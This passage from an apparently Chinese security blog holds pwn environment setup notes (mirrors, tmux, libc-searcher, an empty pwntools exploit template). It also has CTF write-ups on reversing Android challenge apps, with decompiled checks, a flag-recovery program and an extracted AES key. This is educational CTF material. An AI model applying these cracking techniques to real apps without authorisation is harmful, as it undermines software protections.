<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br></pre></td></tr></table></figure>

<p>更新list</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure>





<h2 id="安装-tmux"><a href="#安装-tmux" class="headerlink" title="安装 tmux"></a>安装 tmux</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install tmux</span><br></pre></td></tr></table></figure>

<h4 id="会话外操作"><a href="#会话外操作" class="headerlink" title="会话外操作"></a>会话外操作</h4><p>​     tmux new -s <name-of-my-session> 在会话外创建一个新的会话<br>​    tmux ls   在会话外获取会话列表<br>​    tmux a（attach） -t <name-of-my-session>   在会话外进入会话，不带名字进入第一个会话<br>​    tmux kill-session -t <name-of-my-session>  在会话外删除会话</p>
<p>上面的操作是在普通命令行下操作的，所以不用按前缀键。下面的都是在tmux中操作的，所以需要按前缀键，默认是ctrl-b；在tmux中，输入冒号是开启命令行</p>
<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>​    ?    列出所有快捷键；按q返回<br>​    d    脱离当前会话,可暂时返回Shell界面，输入tmux attach能够重新进入之前会话<br>​    s    选择并切换会话；在同时开启了多个会话时使用<br>​    D    选择要脱离的会话；在同时开启了多个会话时使用<br>​    :    进入命令行模式；此时可输入支持的命令，例如kill-server所有tmux会话<br>​    [    复制模式，光标移动到复制内容位置，空格键开始，方向键选择复制，回车确认，q/Esc退出<br>​    ]    进入粘贴模式，粘贴之前复制的内容，按q/Esc退出<br>​    ~    列出提示信息缓存；其中包含了之前tmux返回的各种提示信息<br>​    t    显示当前的时间 </p>
<h4 id="会话操作"><a href="#会话操作" class="headerlink" title="会话操作"></a>会话操作</h4><p>:new -s <name-of-my-new-session>    进入会话后创建新的会话<br>     s   列出会话，进行选择<br>     :kill-session    删除当前会话<br>     :kill-server     删除所有会话</p>
<h4 id="窗口操作"><a href="#窗口操作" class="headerlink" title="窗口操作"></a>窗口操作</h4><p>​    c    创建新窗口<br>​    &amp;    关闭当前窗口<br>​    数字键    切换到指定窗口<br>​    p    切换至上一窗口<br>​    n    切换至下一窗口<br>​    l    前后窗口间互相切换<br>​    w    通过窗口列表切换窗口<br>​    ,    重命名当前窗口，便于识别<br>​    .    修改当前窗口编号，相当于重新排序<br>​    f    在所有窗口中查找关键词，便于窗口多了切换</p>
<h4 id="面板操作"><a href="#面板操作" class="headerlink" title="面板操作"></a>面板操作</h4><p>​    “    将当前面板上下分屏<br>​    %    将当前面板左右分屏<br>​    x    关闭当前分屏<br>​    z    tmux 1.8新特性，最大化当前所在面板，重复一遍返回<br>​    !    将当前面板置于新窗口,即新建一个窗口,其中仅包含当前面板<br>​    Ctrl+方向键    以1个单元格为单位移动边缘以调整当前面板大小<br>​    Alt+方向键    以5个单元格为单位移动边缘以调整当前面板大小<br>​    空格键    可以在默认面板布局中切换，试试就知道了<br>​    q    显示面板编号<br>​    o    选择当前窗口中下一个面板<br>​    方向键    移动光标选择对应面板<br>​    {    向前置换当前面板<br>​    }    向后置换当前面板<br>​    Alt+o    逆时针旋转当前窗口的面板<br>​    Ctrl+o    顺时针旋转当前窗口的面板</p>
<h2 id="libc-searcher-使用"><a href="#libc-searcher-使用" class="headerlink" title="libc searcher 使用"></a>libc searcher 使用</h2><p>./get 下载get工具, 若已下载请直接跳过</p>
<p>./add usr/lib/libc-2.21-so 向数据库中添加自定义 libc</p>
<p>./find __libc_start_main xxx 这里输入你要查找的函数的真实地址的后三位</p>
<p>./dump xxx 转储一些有用的偏移量，给出一个 libc id, 这里输入第三步得到的结果中id后的libc库</p>
<p>这样你就可以得到需要的文件中的偏移地址了</p>
<p><a target="_blank" rel="noopener" href="https://libc.blukat.me/">网页libc searcher</a></p>
<h2 id="exp预备脚本"><a href="#exp预备脚本" class="headerlink" title="exp预备脚本"></a>exp预备脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line"># author: i0gan</span><br><span class="line"># env: pwndocker [skysider&#x2F;pwndocker (v: 2020&#x2F;09&#x2F;09)]</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">elf_path  &#x3D; &#39;pwn&#39;</span><br><span class="line"></span><br><span class="line">arch &#x3D; &#39;64&#39;</span><br><span class="line">libc_v &#x3D; &#39;2.27&#39;</span><br><span class="line"></span><br><span class="line">ld_path   &#x3D; &#39;&#x2F;glibc&#x2F;&#39; + libc_v + &#39;&#x2F;&#39; + arch + &#39;&#x2F;lib&#x2F;ld-linux-x86-64.so.2&#39;</span><br><span class="line">libs_path &#x3D; &#39;&#x2F;glibc&#x2F;&#39; + libc_v + &#39;&#x2F;&#39; + arch + &#39;&#x2F;lib&#39;</span><br><span class="line">libc_path &#x3D; &#39;&#x2F;glibc&#x2F;&#39; + libc_v + &#39;&#x2F;&#39; + arch + &#39;&#x2F;lib&#x2F;libc.so.6&#39;</span><br><span class="line">libc_path &#x3D; &#39;.&#x2F;libc.so.6&#39;</span><br><span class="line"></span><br><span class="line"># change ld path </span><br><span class="line">change_ld_cmd &#x3D; &#39;patchelf  --set-interpreter &#39; + ld_path +&#39; &#39; + elf_path</span><br><span class="line">os.system(change_ld_cmd)</span><br><span class="line"></span><br><span class="line"># remote server ip and port</span><br><span class="line">server_ip &#x3D; &quot;0.0.0.0&quot;</span><br><span class="line">server_port &#x3D; 0</span><br><span class="line"></span><br><span class="line"># if local debug</span><br><span class="line">LOCAL &#x3D; 1</span><br><span class="line">LIBC  &#x3D; 0</span><br><span class="line"></span><br><span class="line">r   &#x3D;  lambda x : io.recv(x)</span><br><span class="line">ra  &#x3D;  lambda   : io.recvall()</span><br><span class="line">rl  &#x3D;  lambda   : io.recvline(keepends &#x3D; True)</span><br><span class="line">ru  &#x3D;  lambda x : io.recvuntil(x, drop &#x3D; True)</span><br><span class="line">s   &#x3D;  lambda x : io.send(x)</span><br><span class="line">sl  &#x3D;  lambda x : io.sendline(x)</span><br><span class="line">sa  &#x3D;  lambda x, y : io.sendafter(x, y)</span><br><span class="line">sla &#x3D;  lambda x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  &#x3D;  lambda : io.interactive()</span><br><span class="line">c   &#x3D;  lambda : io.close()</span><br><span class="line">li    &#x3D; lambda x : log.info(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)</span><br><span class="line">#--------------------------func-----------------------------</span><br><span class="line">def db():</span><br><span class="line">	if(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#--------------------------exploit--------------------------</span><br><span class="line">def exploit():</span><br><span class="line">	li(&#39;exploit...&#39;)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">def finish():</span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line">#--------------------------main-----------------------------</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	</span><br><span class="line">	if LOCAL:</span><br><span class="line">		elf &#x3D; ELF(elf_path)</span><br><span class="line">		if LIBC:</span><br><span class="line">			libc &#x3D; ELF(libc_path)</span><br><span class="line">			io &#x3D; elf.process(env &#x3D; &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )</span><br><span class="line">		else:</span><br><span class="line">			io &#x3D; elf.process(env &#x3D; &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	else:</span><br><span class="line">		elf &#x3D; ELF(elf_path)</span><br><span class="line">		io &#x3D; remote(server_ip, server_port)</span><br><span class="line">		if LIBC:</span><br><span class="line">			libc &#x3D; ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><a target="_blank" rel="noopener" href="https://e3pem.github.io/2019/04/19/%E6%9D%82%E9%A1%B9/%E5%9C%A8docker%E4%B8%AD%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/">pwn docker 环境参考</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/11/pwn-docker-env/" data-id="ckhemv80v0019wdcm8zqxf2v5" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn-env/" rel="tag">pwn-env</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-android-revese-0" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/07/android-revese-0/" class="article-date">
  <time datetime="2020-09-07T08:36:01.000Z" itemprop="datePublished">2020-09-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/reverse/">reverse</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/07/android-revese-0/">Android 逆向入门</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Android-Re-入门"><a href="#Android-Re-入门" class="headerlink" title="Android Re 入门"></a>Android Re 入门</h1><h2 id="必备工具"><a href="#必备工具" class="headerlink" title="必备工具:"></a>必备工具:</h2><p>IDA : 反编译.so文件</p>
<p>AndroidKiller: 反编译apk文件及再次编译为apk</p>
<p>jd-gui  : 将.jar文件反编译为java代码</p>
<p>dex2jar: 反编译.dex文件</p>
<p>apktool: 能够反编译及回编译apk</p>
<p>夜神模拟器: 运行apk文件</p>
<h2 id="例题-1-easy-so"><a href="#例题-1-easy-so" class="headerlink" title="例题 1 [easy-so]"></a>例题 1 [easy-so]</h2><p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/media/task/attachments/456c1dab04b24036ba1d6e32a08dc882.apk">下载</a></p>
<p>来源:攻防世界</p>
<p>使用夜神模拟器运行该apk文件, 发现需要输入flag</p>
<p>zip解压apk文件, 用 dex2jar反编译 classes.dex文件得到classes-dex2jar.jar,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2j-dex2jar.bat classes.dex</span><br></pre></td></tr></table></figure>

<p> 再用jd-gui打开classes-dex2jar.jar反编译为java代码.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle paramBundle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(paramBundle);</span><br><span class="line">    setContentView(<span class="number">2131296283</span>);</span><br><span class="line">    ((Button)findViewById(<span class="number">2131165218</span>)).setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View param1View)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (cyberpeace.CheckString(((EditText)MainActivity.<span class="keyword">this</span>.findViewById(<span class="number">2131165233</span>)).getText().toString()) == <span class="number">1</span>) &#123;</span><br><span class="line">              Toast.makeText((Context)MainActivity.<span class="keyword">this</span>, <span class="string">&quot;, 1).show();</span></span><br><span class="line"><span class="string">              return;</span></span><br><span class="line"><span class="string">            &#125; </span></span><br><span class="line"><span class="string">            Toast.makeText((Context)MainActivity.this, &quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里可以发现, cyberpeace加载了’cyberpeace’动态库, CheckString函数是native层的, 这个函数的实现就在libcyberpeace.so文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package com.testjava.jack.pingan2;</span><br><span class="line"></span><br><span class="line">public class cyberpeace &#123;</span><br><span class="line">  static &#123;</span><br><span class="line">    System.loadLibrary(&quot;cyberpeace&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public static native int CheckString(String paramString);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用ida打开lib/x86/libcyberpeace.so文件, 找到 _BOOL4 __cdecl Java_com_testjava_jack_pingan2_cyberpeace_CheckString(int a1, int a2, int a3)函数, 该函数实现如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl Java_com_testjava_jack_pingan2_cyberpeace_CheckString(int a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  const char *get_str; &#x2F;&#x2F; ST1C_4</span><br><span class="line">  size_t len; &#x2F;&#x2F; edi</span><br><span class="line">  char *str; &#x2F;&#x2F; esi</span><br><span class="line">  size_t i; &#x2F;&#x2F; edi</span><br><span class="line">  char v7; &#x2F;&#x2F; al</span><br><span class="line">  char v8; &#x2F;&#x2F; al</span><br><span class="line">  size_t v9; &#x2F;&#x2F; edi</span><br><span class="line">  char v10; &#x2F;&#x2F; al</span><br><span class="line"></span><br><span class="line">  get_str &#x3D; (const char *)(*(int (__cdecl **)(int, int, _DWORD))(*(_DWORD *)a1 + 676))(a1, a3, 0); &#x2F;&#x2F; 从java层获取所输入的字符串</span><br><span class="line">  len &#x3D; strlen(get_str);</span><br><span class="line">  str &#x3D; (char *)malloc(len + 1);</span><br><span class="line">  memset(&amp;str[len], 0, len !&#x3D; -1);</span><br><span class="line">  memcpy(str, get_str, len);</span><br><span class="line">  if ( strlen(str) &gt;&#x3D; 2 ) &#x2F;&#x2F; 加密1</span><br><span class="line">  &#123;</span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v7 &#x3D; str[i];</span><br><span class="line">      str[i] &#x3D; str[i + 16];</span><br><span class="line">      str[i++ + 16] &#x3D; v7;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( i &lt; strlen(str) &gt;&gt; 1 );</span><br><span class="line">  &#125;</span><br><span class="line">  &#x2F;&#x2F; 加密2</span><br><span class="line">  v8 &#x3D; *str;</span><br><span class="line">  if ( *str )</span><br><span class="line">  &#123;</span><br><span class="line">    *str &#x3D; str[1];</span><br><span class="line">    str[1] &#x3D; v8;</span><br><span class="line">    if ( strlen(str) &gt;&#x3D; 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 &#x3D; 2;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v10 &#x3D; str[v9];</span><br><span class="line">        str[v9] &#x3D; str[v9 + 1];</span><br><span class="line">        str[v9 + 1] &#x3D; v10;</span><br><span class="line">        v9 +&#x3D; 2;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v9 &lt; strlen(str) );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return strcmp(str, &quot;f72c5a36569418a20907b55be5bf95ad&quot;) &#x3D;&#x3D; 0; &#x2F;&#x2F; 与字符串作比较</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从以上发现, 对我们所输入的字符串进行了加密, 然后再与f72c5a36569418a20907b55be5bf95ad进行比较. 现在只需逆一下以上代码即可得到flag, exp代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">	char str[] &#x3D; &quot;f72c5a36569418a20907b55be5bf95ad&quot;;</span><br><span class="line">	int i, v7, v8, v9, v10;</span><br><span class="line">	v8 &#x3D; *str;</span><br><span class="line">	if ( *str ) &#123;</span><br><span class="line">		*str &#x3D; str[1];</span><br><span class="line">		str[1] &#x3D; v8;</span><br><span class="line">		if ( strlen(str) &gt;&#x3D; 3 ) &#123;</span><br><span class="line">      		v9 &#x3D; 2;</span><br><span class="line">      		do &#123;</span><br><span class="line">        		v10 &#x3D; str[v9];</span><br><span class="line">        		str[v9] &#x3D; str[v9 + 1];</span><br><span class="line">        		str[v9 + 1] &#x3D; v10;</span><br><span class="line">        		v9 +&#x3D; 2;</span><br><span class="line">      		&#125; while ( v9 &lt; strlen(str) );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; 交换 </span><br><span class="line">	if ( strlen(str) &gt;&#x3D; 2 )	&#123;</span><br><span class="line">   	 i &#x3D; 0;</span><br><span class="line">    	do &#123;</span><br><span class="line">      		v7 &#x3D; str[i];</span><br><span class="line">      		str[i] &#x3D; str[i + 16];</span><br><span class="line">     		str[i++ + 16] &#x3D; v7;</span><br><span class="line">   	 	&#125; while ( i &lt; strlen(str) &gt;&gt; 1 );</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;%s&quot;, str);</span><br><span class="line">  </span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行以上代码即可获取flag</p>
<h1 id="例题-2-app2"><a href="#例题-2-app2" class="headerlink" title="例题 2 [app2]"></a>例题 2 [app2]</h1><p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=mobile&number=6&grade=0&id=5086&page=1">下载</a></p>
<p>来源:攻防世界</p>
<p>对输入的账号和密码在SecondActivity类中进行加密判断, 而加密调用了native层的加密函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle paramBundle) &#123;</span><br><span class="line">    super.onCreate(paramBundle);</span><br><span class="line">    setContentView(2130903041);</span><br><span class="line">    Intent intent &#x3D; getIntent();</span><br><span class="line">    String str1 &#x3D; intent.getStringExtra(&quot;ili&quot;);</span><br><span class="line">    String str2 &#x3D; intent.getStringExtra(&quot;lil&quot;);</span><br><span class="line">    if (Encryto.doRawData(this, str1 + str2).equals(&quot;VEIzd&#x2F;V2UPYNdn&#x2F;bxH3Xig&#x3D;&#x3D;&quot;)) &#123;</span><br><span class="line">      intent.setAction(&quot;android.test.action.MoniterInstallService&quot;);</span><br><span class="line">      intent.setClass((Context)this, MoniterInstallService.class);</span><br><span class="line">      intent.putExtra(&quot;company&quot;, &quot;tencent&quot;);</span><br><span class="line">      intent.putExtra(&quot;name&quot;, &quot;hacker&quot;);</span><br><span class="line">      intent.putExtra(&quot;age&quot;, 18);</span><br><span class="line">      startActivity(intent);</span><br><span class="line">      startService(intent);</span><br><span class="line">    &#125; </span><br><span class="line">    SharedPreferences.Editor editor &#x3D; getSharedPreferences(&quot;test&quot;, 0).edit();</span><br><span class="line">    editor.putString(&quot;ilil&quot;, str1);</span><br><span class="line">    editor.putString(&quot;lili&quot;, str2);</span><br><span class="line">    editor.commit();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>IDA反编译doRawData函数, 因为a为对象, 选择a按下y 键 然后输入 JNIEnv*就可以显示对象的函数调用, 如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl doRawData(JNIEnv *a1, int a2, int a3, int a4)</span><br><span class="line">&#123;</span><br><span class="line">  char *v4; &#x2F;&#x2F; esi</span><br><span class="line">  const char *v5; &#x2F;&#x2F; ST10_4</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  char *v7; &#x2F;&#x2F; esi</span><br><span class="line">  jstring (*v8)(JNIEnv *, const jchar *, jsize); &#x2F;&#x2F; ST10_4</span><br><span class="line">  size_t v9; &#x2F;&#x2F; eax</span><br><span class="line">  int v10; &#x2F;&#x2F; [esp+4h] [ebp-28h]</span><br><span class="line">  int v11; &#x2F;&#x2F; [esp+8h] [ebp-24h]</span><br><span class="line">  int v12; &#x2F;&#x2F; [esp+Ch] [ebp-20h]</span><br><span class="line">  int v13; &#x2F;&#x2F; [esp+10h] [ebp-1Ch]</span><br><span class="line">  char v14; &#x2F;&#x2F; [esp+14h] [ebp-18h]</span><br><span class="line">  unsigned int v15; &#x2F;&#x2F; [esp+18h] [ebp-14h]</span><br><span class="line"></span><br><span class="line">  v15 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  if ( checkSignature((int)a1, a2, a3) &#x3D;&#x3D; 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 &#x3D; 0;</span><br><span class="line">    v13 &#x3D; 0x3D3D7965;</span><br><span class="line">    v12 &#x3D; 0x6B747365;</span><br><span class="line">    v11 &#x3D; 0x74617369;</span><br><span class="line">    v10 &#x3D; 0x73696874;</span><br><span class="line">    v4 &#x3D; (char *)(*a1)-&gt;GetStringUTFChars(a1, (jstring)a4, 0);</span><br><span class="line">    v5 &#x3D; (const char *)AES_128_ECB_PKCS5Padding_Encrypt(v4, (int)&amp;v10);</span><br><span class="line">    (*a1)-&gt;ReleaseStringUTFChars(a1, (jstring)a4, v4);</span><br><span class="line">    result &#x3D; (int)(*a1)-&gt;NewStringUTF(a1, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v7 &#x3D; UNSIGNATURE[0];</span><br><span class="line">    v8 &#x3D; (*a1)-&gt;NewString;</span><br><span class="line">    v9 &#x3D; strlen(UNSIGNATURE[0]);</span><br><span class="line">    result &#x3D; (int)v8(a1, (const jchar *)v7, v9);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现, 加密方式为aes加密, key 为 v10中的内容.为thisisatestkey==</p>
<p>对VEIzd/V2UPYNdn/bxH3Xig== 解密为aimagetencent, 发现提交flag错误, 重新找另一个字符串,在FileDataActivity类中找到如下.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class FileDataActivity extends a &#123;</span><br><span class="line">  private TextView c;</span><br><span class="line">  </span><br><span class="line">  protected void onCreate(Bundle paramBundle) &#123;</span><br><span class="line">    super.onCreate(paramBundle);</span><br><span class="line">    setContentView(2130903042);</span><br><span class="line">    this.c &#x3D; (TextView)findViewById(2131165184);</span><br><span class="line">    this.c.setText(Encryto.decode(this, &quot;9YuQ2dk8CSaCe7DTAmaqAA&#x3D;&#x3D;&quot;));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用了decode函数, 而decode函数与doRawData实现一样, 直接与之前一样的AES ecb解密, 得到flag</p>
<h1 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h1><p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/media/task/attachments/f6adc401d0eb472892a4ac4481f76a85.apk">下载</a></p>
<p>来源:攻防世界</p>
